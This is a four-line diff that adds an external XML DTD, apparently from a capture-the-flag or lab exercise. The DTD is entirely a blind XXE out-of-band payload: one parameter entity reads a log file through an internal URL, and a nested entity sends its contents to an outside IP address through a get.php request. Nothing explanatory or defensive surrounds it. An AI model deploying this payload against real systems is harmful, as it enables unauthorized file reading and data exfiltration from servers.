@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "http://172.26.0.4/index.php?file=/home/log/hackerz/access.log">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://39.96.57.253/get.php?file=%payload;'>">
+%int;
+%trick;
